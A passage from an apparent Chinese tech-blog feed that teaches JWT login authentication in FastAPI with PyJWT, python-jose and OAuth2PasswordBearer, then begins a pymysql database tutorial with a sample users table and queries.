class="hljs-built_in">print</span>(raw_data)<br></code></pre></td></tr></table></figure><ul><li>校验token失败时的处理</li><li>jwt库中提供了非常多了校验失败的错误，我们可以直接使用。或者直接使用Exception也可以。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> datetime<br><br>secret_key = <span class="hljs-string">&quot;加盐的秘钥&quot;</span><br>data = &#123;<span class="hljs-string">&quot;user_id&quot;</span>: <span class="hljs-number">20202</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;liuxu&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;liuxu@as.com&quot;</span>,<br>        <span class="hljs-string">&quot;exp&quot;</span>: datetime.datetime.now() + datetime.timedelta(days=-<span class="hljs-number">1</span>)&#125;<br><br><br>jwt_token = jwt.encode(payload=data, key=secret_key)<br><span class="hljs-keyword">try</span>:<br>    raw_data = jwt.decode(jwt_token, key=secret_key, algorithms=<span class="hljs-string">&quot;HS256&quot;</span>)<br>    <span class="hljs-built_in">print</span>(raw_data)<br><span class="hljs-keyword">except</span> jwt.ExpiredSignatureError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h1 id="9-10-fastapi集成jwt"><a href="#9-10-fastapi集成jwt" class="headerlink" title="9-10 fastapi集成jwt"></a>9-10 fastapi集成jwt</h1><p>需求：使用jwt做登录校验，在登录成功后给用户签发jwttoken，在图书接口中校验jwttoken, 校验失败则报错，校验成功返回数据</p><p>示例1：使用pyjwt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> datetime<br><br><br>JWT_SECRET_KEY = <span class="hljs-string">&quot;ASDN*^n23^$:_&#125;;pYz7I&quot;</span><br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">response: Response,  username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    db_user: User = db.query(User).filter_by(username=username).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db_user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名不存在&quot;</span>, status_code=<span class="hljs-number">400</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> crypt.verify(password, db_user.password):<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名或密码错误&quot;</span>, status_code=<span class="hljs-number">400</span>)<br><br>    <span class="hljs-comment"># 签发jwttoken, 并保存在响应头上</span><br>    exp = datetime.datetime.now() + datetime.timedelta(days=<span class="hljs-number">1</span>)<br>    jwt_token = jwt.encode(payload=&#123;<span class="hljs-string">&quot;id&quot;</span>: db_user.<span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;name&quot;</span>: db_user.username, <span class="hljs-string">&quot;exp&quot;</span>: exp&#125;, key=JWT_SECRET_KEY)<br>    response.headers[<span class="hljs-string">&quot;x-token&quot;</span>] = jwt_token<br>    <span class="hljs-keyword">return</span> db_user<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">books</span>(<span class="hljs-params">x_token: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = Header(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-comment"># 请求头取取 x-token，解析token并获取用户信息</span><br>    <span class="hljs-keyword">try</span>:<br>        data = jwt.decode(x_token, key=JWT_SECRET_KEY, algorithms=<span class="hljs-string">&quot;HS256&quot;</span>)<br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">f&quot;welcome: <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;name&#x27;</span>]&#125;</span>&quot;</span>,<br>            <span class="hljs-string">&quot;books&quot;</span>: [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;book<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]<br>        &#125;<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=e, status_code=<span class="hljs-number">404</span>)<br></code></pre></td></tr></table></figure><p>示例2：使用第三方包 python-jose来签发和校验jwttoken，使用前先安装：<code>pip3 install &quot;python-jose[cryptography]&quot;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-keyword">from</span> jose <span class="hljs-keyword">import</span> jwt, JWTError<br><br><br>SECRET_KEY = <span class="hljs-string">&quot;09d25e094faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7&quot;</span><br>JWT_EXP = datetime.datetime.now() + datetime.timedelta(days=<span class="hljs-number">1</span>)<br><br>data = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;liuxu&quot;</span>, <span class="hljs-string">&quot;exp&quot;</span>: JWT_EXP&#125;<br>jwt_token = jwt.encode(data, SECRET_KEY, algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br><span class="hljs-built_in">print</span>(jwt_token)<br><br><span class="hljs-keyword">try</span>:<br>    data = jwt.decode(jwt_token, SECRET_KEY, <span class="hljs-string">&quot;HS256&quot;</span>)<br>    <span class="hljs-built_in">print</span>(data)<br><span class="hljs-keyword">except</span> JWTError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-keyword">raise</span> e<br></code></pre></td></tr></table></figure><h1 id="9-11-fastapi的登录认证工具"><a href="#9-11-fastapi的登录认证工具" class="headerlink" title="9-11 fastapi的登录认证工具"></a>9-11 fastapi的登录认证工具</h1><p><strong>场景</strong></p><p>现在已经可以使用jwt做登录认证了，但是会发现在开发的时候，这个流程比较麻烦。</p><p>比如，你在api文档页面操作：</p><ul><li>1 先调用登录接口，登录后在响应头中把x-token复制出来</li><li>2 然后调用图书接口时，把复制出来的jwttoken贴在请求上</li><li>3 一个图书接口操作一遍还行，但是如果有很多接口都依赖登录，就会很麻烦。那有比较优雅的解决方式吗？</li></ul><p><strong>FastAPI的解决方式</strong></p><ul><li>使用OAuth2PasswordBearer，实现自动登录认证</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Form, Depends, HTTPException<br><span class="hljs-keyword">from</span> fastapi.security <span class="hljs-keyword">import</span> OAuth2PasswordBearer<br><span class="hljs-keyword">from</span> jose <span class="hljs-keyword">import</span> jwt, JWTError<br><br><br>app = FastAPI(title=<span class="hljs-string">&quot;XXX项目文档&quot;</span>)<br><br><span class="hljs-comment"># 第一步：实例化对象oauth2_scheme， tokenUrl=&quot;login&quot;表示依赖的登录接口是 &quot;/login&quot;</span><br>oauth2_scheme = OAuth2PasswordBearer(tokenUrl=<span class="hljs-string">&quot;login&quot;</span>)<br><br><br>SECRET_KEY = <span class="hljs-string">&quot;09d25e094faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7&quot;</span><br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;wrong username or password&quot;</span>, status_code=<span class="hljs-number">404</span>)<br><br>    exp = datetime.utcnow() + timedelta(days=<span class="hljs-number">1</span>)<br>    access_token = jwt.encode(&#123;<span class="hljs-string">&quot;sub&quot;</span>: username, <span class="hljs-string">&quot;exp&quot;</span>: exp&#125;, SECRET_KEY, <span class="hljs-string">&quot;HS256&quot;</span>)<br>    <br>    <span class="hljs-comment"># 第二步：登录成功后返回 access_token和token_type两个字段</span><br>    <span class="hljs-comment"># access_token是jwttoken，token_type=&quot;bearer&quot;</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;access_token&quot;</span>: access_token, <span class="hljs-string">&quot;token_type&quot;</span>: <span class="hljs-string">&quot;bearer&quot;</span>&#125;<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books_list</span>(<span class="hljs-params">token: <span class="hljs-built_in">str</span> = Depends(<span class="hljs-params">oauth2_scheme</span>)</span>):<br>    <span class="hljs-comment"># 第三步：需要登录后才能使用的接口，使用依赖注入Depends(oauth2_scheme)</span><br>    <span class="hljs-comment"># oauth2_scheme会帮我们解析出jwttoken，并赋值给形参token</span><br>    <span class="hljs-keyword">try</span>:<br>        data = jwt.decode(token, key=SECRET_KEY, algorithms=<span class="hljs-string">&quot;HS256&quot;</span>)<br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">f&quot;hello: <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;sub&#x27;</span>]&#125;</span>&quot;</span>,<br>            <span class="hljs-string">&quot;books&quot;</span>: [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">f&quot;book<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br>        &#125;<br>    <span class="hljs-keyword">except</span> JWTError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> e<br></code></pre></td></tr></table></figure><p>下图是openadpi文档的登录认证交互窗口，有了它我们就不必再手动调用登录接口，复制token了</p><p><img src="/img/fastapi/image-20220730105310760.png" alt="image-20220730105310760"></p><p>补充：</p><ul><li>OpenAPI文档不支持携带特殊的请求头字段，但是自定义的请求头是OK的</li></ul><h1 id="9-12-fastapi登录认证工具的内部原理"><a href="#9-12-fastapi登录认证工具的内部原理" class="headerlink" title="9-12 fastapi登录认证工具的内部原理"></a>9-12 fastapi登录认证工具的内部原理</h1><p>一些感想：</p><ul><li><p>在接口自动化测试当中，有一个经常处理的东西就是把请求带上token,然后后面每一个请求都是要带token的，如果后段使用的是JWT的这样的形式的话，可以找后端要到这个机密的方式，盐值，调用这个加密的方法，通过传入payload 负载信息（一般是用户信息）然后加上盐值再加上算法去进行加密</p></li><li><p>以前的token解决方式：</p><ul><li>登陆注册，拿到token,保存变量，传递给下一个接口</li></ul></li><li><p>现在可以更优雅的解决：</p><ul><li><p>拿到后端的加密方式和盐值，</p></li><li><p>组装Header(头) + Payload(负载) + Signature(签名)</p></li><li><p>Header(头)一般是固定的 </p></li><li><pre><code class="python">&#123;  &quot;alg&quot;: &quot;HS256&quot;, # alg（算法）  &quot;typ&quot;: &quot;JWT&quot; # typ（类型）&#125;<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- Payload(负载)一般是用户信息-名称之类的，<br><br>- ```python<br>  &#123;<br>    <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;1234567890&quot;</span>,<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John Doe&quot;</span>,<br>    <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-literal">true</span><br>  &#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>Signature(签名—签名通常由头部、负载、密钥和指定的算法生成</p></li><li><pre><code class="python"> # 签发jwttoken, 并保存在响应头上    exp = datetime.datetime.now() + datetime.timedelta(days=1)    jwt_token = jwt.encode(payload=&#123;&quot;id&quot;: db_user.id, &quot;name&quot;: db_user.username, &quot;exp&quot;: exp&#125;, key=JWT_SECRET_KEY)    response.headers[&quot;x-token&quot;] = jwt_token<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>- 最后把组合起来的jwt 添加到request.session里面，这样这个回话做什么都会带上这个jwt了<br><br><span class="hljs-comment"># 9-13 登录相关工具封装</span><br><br>- 密码加密和校验封装成一个工具<br>- jwt签发和解析封装成一个工具<br><br>```py<br><span class="hljs-comment"># tools.py</span><br><br><span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-keyword">from</span> passlib.context <span class="hljs-keyword">import</span> CryptContext<br><span class="hljs-keyword">from</span> jose <span class="hljs-keyword">import</span> jwt, JWTError<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hashing</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, schemes: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;bcrypt&quot;</span></span>):<br>        self.crypt = CryptContext(schemes=[schemes], deprecated=<span class="hljs-string">&quot;auto&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hash</span>(<span class="hljs-params">self, raw_pwd: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> self.crypt.<span class="hljs-built_in">hash</span>(raw_pwd)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">verify</span>(<span class="hljs-params">self, raw_pwd: <span class="hljs-built_in">str</span>, hashed_pwd: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>        <span class="hljs-keyword">return</span> self.crypt.verify(raw_pwd, hashed_pwd)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Jwt</span>:<br>    JWT_KEY = <span class="hljs-string">&quot;ASDN*^n23^$:_&#125;;pYz7I&quot;</span><br>    ALGORITHMS = <span class="hljs-string">&quot;HS256&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_token</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exp&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>            data[<span class="hljs-string">&quot;exp&quot;</span>] = datetime.datetime.now() + datetime.timedelta(days=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> jwt.encode(data, key=self.JWT_KEY)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_token</span>(<span class="hljs-params">self, jwt_token: <span class="hljs-built_in">str</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> jwt.decode(jwt_token, self.JWT_KEY, self.ALGORITHMS)<br>        <span class="hljs-keyword">except</span> JWTError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> e<br><br><br>hash_obj = Hashing()<br>jwt_obj = Jwt()<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li><p>使用时，直接导入</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tools <span class="hljs-keyword">import</span> hash_obj, jwt_obj<br><br>app = FastAPI(title=<span class="hljs-string">&quot;登录认证相关&quot;</span>)<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/register&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">user: UserForm = Depends(<span class="hljs-params"></span>), db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>   ...<br>    new_user = User(<br>        username=user.username,<br>        password=hash_obj.<span class="hljs-built_in">hash</span>(user.password),<span class="hljs-comment"># hash加密</span><br>        email=user.email<br>    )<br>   ...<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, response_model=UserOut</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">response: Response,  username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    db_user: User = db.query(User).filter_by(username=username).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db_user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名不存在&quot;</span>, status_code=<span class="hljs-number">400</span>)<br>        <br>    <span class="hljs-comment"># hash校验</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> hash_obj.verify(password, db_user.password):<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">&quot;用户名或密码错误&quot;</span>, status_code=<span class="hljs-number">400</span>)<br><span class="hljs-comment"># jwt签发</span><br>    jwt_token = jwt_obj.set_token(&#123;<span class="hljs-string">&quot;id&quot;</span>: db_user.<span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;name&quot;</span>: db_user.username&#125;)<br>    response.headers[<span class="hljs-string">&quot;authorization&quot;</span>] = jwt_token<br>    <span class="hljs-keyword">return</span> db_user<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">books</span>(<span class="hljs-params">authorization: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = Header(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-comment"># jwt解析</span><br>    data = jwt_obj.get_token(authorization)<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">f&quot;welcome: <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;name&#x27;</span>]&#125;</span>&quot;</span>,<br>        <span class="hljs-string">&quot;books&quot;</span>: [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;book<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]<br>    &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>编程，web开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】FastAPI之数据库操作（五）</title>
    <link href="/2024/02/28/685FastAPI5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/"/>
    <url>/2024/02/28/685FastAPI5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="8-1-关系型数据库"><a href="#8-1-关系型数据库" class="headerlink" title="8-1 关系型数据库"></a>8-1 关系型数据库</h1><p>由于之前学过数据库基础知识，这里不做介绍只做对比</p><p>场景的数据库一般表现为软件，比如</p><ul><li>MySQL、Oracle、SQL Server、PostgreSQL、DB2、SQLite等等（关系型数据库）。</li><li>Redis、Memcached、MangoDb等等（键值型数据库）。</li></ul><p><strong>关系型数据库</strong></p><ul><li>关系型数据库，是指采用了<a href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%A8%A1%E5%9E%8B/3189329">关系模型</a>来组织数据的数据库，其以行和列的形式存储数据，可以类比EXCEL表格。</li><li>一张表可以包含多列，每一列都有一个标题字段。然后可以有N行，一行数据有多个字段</li><li>一个数据库中可以包含多张表。</li></ul><h1 id="8-2-使用pymysql"><a href="#8-2-使用pymysql" class="headerlink" title="8-2 使用pymysql"></a>8-2 使用pymysql</h1><h2 id="8-2使用pymysql查询"><a href="#8-2使用pymysql查询" class="headerlink" title="8-2使用pymysql查询"></a>8-2使用pymysql查询</h2><ul><li>在数据库 <code>db</code> 中新建下面这张 <code>users</code>表</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">-- 新建一个数据库，名字是 db<br>create database db charset utf8;<br><br>-- 使用 db<br>use db;<br><br>-- 在db中新建一张 users表<br>CREATE TABLE `users` (<br>    `<span class="hljs-built_in">id</span>` <span class="hljs-built_in">int</span>(<span class="hljs-number">11</span>) NOT NULL AUTO_INCREMENT,<br>    `name` varchar(<span class="hljs-number">255</span>) COLLATE utf8_bin NOT NULL,<br>    `password` varchar(<span class="hljs-number">255</span>) COLLATE utf8_bin NOT NULL,<br>    PRIMARY KEY (`<span class="hljs-built_in">id</span>`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin AUTO_INCREMENT=<span class="hljs-number">1</span> ;<br><br><br>-- 插入两条数据<br>insert into users(name, password) values(<span class="hljs-string">&quot;liuxu&quot;</span>,<span class="hljs-string">&quot;12345&quot;</span>);<br>insert into users(name, password) values(<span class="hljs-string">&quot;liuxu2&quot;</span>,<span class="hljs-string">&quot;12345&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>通过Python代码连接数据库并查询数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<br><br><span class="hljs-comment"># 获取连接</span><br>conn = pymysql.connect(<br>    host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    port=<span class="hljs-number">3306</span>,<br>    user=<span class="hljs-string">&#x27;root&#x27;</span>,<br>    password=<span class="hljs-string">&#x27;12345&#x27;</span>,<br>    database=<span class="hljs-string">&#x27;db&#x27;</span>,<br>    charset=<span class="hljs-string">&#x27;utf8&#x27;</span><br>)<br><br><span class="hljs-comment"># 获取游标</span><br>cursor = conn.cursor()<br><br><br><span class="hljs-comment"># 准备SQL语句</span><br>sql = <span class="hljs-string">&#x27;select * from users;&#x27;</span><br><br><br><span class="hljs-built_in">print</span>(cursor.execute(sql))<span class="hljs-comment"># 返回受影响的函数</span><br><br><span class="hljs-built_in">print</span>(cursor.fetchone())        <span class="hljs-comment"># 取出一行数据，(1, &#x27;liuxu&#x27;, &#x27;12345&#x27;)</span><br><span class="hljs-built_in">print</span>(cursor.fetchmany(<span class="hljs-number">2</span>))      <span class="hljs-comment"># 取出N行数据</span><br><span class="hljs-built_in">print</span>(cursor.fetchall())        <span class="hljs-comment"># 取出剩下所有数据</span><br></code></pre></td></tr></table></figure><ul><li>按条件查询</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">...<br><br><br>sql = <span 